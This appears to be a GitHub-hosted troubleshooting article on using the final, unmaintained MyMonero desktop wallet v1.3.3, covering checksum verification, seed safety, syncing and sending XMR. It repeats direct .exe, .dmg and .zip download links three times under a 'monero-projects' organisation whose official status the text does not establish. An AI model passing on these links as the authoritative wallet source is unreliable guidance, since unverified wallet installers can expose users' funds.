<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">How to Use MyMonero Desktop</h1>
<p align="center">What the final desktop app can still do, and how to use it with care.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
The final MyMonero desktop release, v1.3.3, can still open wallets and send XMR, but it is no longer maintained and receives no new features or security updates. Hosted MyMonero servers and web wallet login stopped, so use the desktop app only with realistic expectations and a secure seed backup.

## You'll see this if
- You already have MyMonero desktop and want to know whether it still opens.
- Hosted login or the web wallet is unavailable.
- You need to receive or send XMR from the desktop wallet.
- You are considering continuing with the app versus restoring the seed in Cake Wallet.

## Why it happens
MyMonero desktop has a final release, v1.3.3, published on GitHub. The app can still open wallets and send XMR, but is no longer maintained. That means no new features or security updates. MyMonero hosted servers and web wallet login stopped. The practical choices are to keep using the desktop wallet or restore its seed in Cake Wallet. Cake Wallet runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing.

Wallet use still depends on access to a valid seed and the wallet’s ability to scan and connect as needed. MyMonero used either a 13-word MyMonero-specific legacy seed or a standard 25-word Monero seed. A restore height is where scanning begins: earlier is safer when uncertain but slower. See [seed format differences](./mymonero-seed-13-vs-25-words.md) and [restore height guidance](./mymonero-restore-height-explained.md).

---

## Fix
1. **Use the intended final release.** The release is v1.3.3, with Windows .exe, macOS .dmg, and Linux .zip packages. Download only from the project’s [GitHub release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3). Avoid files supplied in unsolicited messages or unverified download listings.
2. **Check download integrity.** Compare the file’s SHA-256 digest with the value shown on the GitHub release page. On Windows, a command can be `certutil -hashfile <file> SHA256`; on macOS use `shasum -a 256 <file>`; on Linux use `sha256sum <file>`. Compare the displayed digest carefully; do not rely on a checksum copied from an unrelated source.
3. **Open the app cautiously.** On macOS, if the operating system blocks the app, right-click the app and choose Open. Do not bypass warnings for software from an unknown source. If the application does not launch, use the focused guidance for [macOS cannot be opened](./mymonero-macos-cannot-be-opened.md).
4. **Open an existing wallet.** Use the app’s wallet-opening flow and the credentials or wallet data you already control. Do not share a password or seed with someone offering to open it for you. The exact recovery and storage details should not be guessed; rely on information you can verify locally.
5. **Check synchronization and balance.** Allow the wallet to connect and scan. A balance may not appear immediately. If it is zero, review whether scanning is complete and whether the wallet has scanned from an appropriate height. See [MyMonero not syncing](./mymonero-not-syncing.md) and [balance shows zero](./mymonero-balance-shows-zero.md).
6. **Receive carefully.** Use the receiving information shown by the wallet and share only what is needed to receive. Never reveal your seed or private keys. Before accepting a payment, verify the address you provide is from the intended wallet.
7. **Send carefully.** Enter the recipient address yourself or use a source you independently trust. Review address, amount, and fee before confirmation. Nobody legitimate needs the seed to help you send. Use [sending XMR from MyMonero](./mymonero-send-xmr.md) for a focused checklist.
8. **Plan for the future.** Since the app is unmaintained, consider whether continued use suits your needs. You can restore the seed in Cake Wallet on a supported platform, or keep using the desktop app. Restoration and sending to a new wallet are different operations.

> [!TIP]
> Preserve a secure offline copy of your seed before a device change. A working installation is not a substitute for a recovery backup.

> [!WARNING]
> MyMonero desktop has no new security updates. Use only a release you have independently verified, and never share recovery words or keys with anyone.

## If that did not work
If the app does not open, first check that you obtained the correct package for your operating system and that the download completed. For macOS, right-click the app and choose Open when appropriate. Follow [app not opening](./mymonero-app-not-opening.md) for general steps. Do not download a replacement from a stranger.

If a connection error appears, including error 523, treat it as general guidance that a server connection is unavailable. It does not establish that your wallet is invalid. Hosted login has stopped, and the desktop app is no longer maintained; consult the app’s available status and consider restoring your seed in Cake Wallet if appropriate.

If you cannot access the wallet, avoid guessing storage paths or relying on unconfirmed password-reset claims. Protect any seed backup you have. Never post it publicly or send it to a recovery service. See restore MyMonero wallet for seed-based options.

## Prevention
Keep your seed written accurately and securely offline, and know whether it is the 13-word MyMonero format or 25-word standard format. Obtain software only from the release source and verify the SHA-256 value before opening a downloaded file. Avoid using an unmaintained application for longer than necessary without understanding that no security updates arrive. Keep a separate record of your restore height if reliable. Verify addresses and fees before sending. Consider Cake Wallet if its supported platforms meet your needs, but install it only from a trusted source.

## FAQ
<details><summary>Does MyMonero desktop still work?</summary>

The old app still opens wallets and sends XMR, but is no longer maintained and receives no new features or security updates.

</details>

<details><summary>Can I log into the MyMonero web wallet?</summary>

MyMonero hosted servers and web wallet login stopped. The desktop app and seed restore are the described options.

</details>

<details><summary>What is the final release?</summary>

MyMonero desktop’s final release is v1.3.3, with Windows .exe, macOS .dmg, and Linux .zip packages.

</details>

<details><summary>Can I move funds just by restoring?</summary>

No. Restoration gives access to the same wallet. Moving funds to another wallet requires a separate transaction.

</details>

---

## Download MyMonero

- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [Send XMR with MyMonero](./mymonero-send-xmr.md) | Verify the recipient, amount, and fee before confirming a transaction. |
| [Withdraw XMR From MyMonero to an Exchange](./mymonero-withdraw-to-exchange.md) | How to send Monero safely from the desktop wallet to an exchange deposit address. |
| [Restore a MyMonero Wallet](./restore-mymonero-wallet.md) | Recover access by restoring a compatible seed in MyMonero desktop or Cake Wallet. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
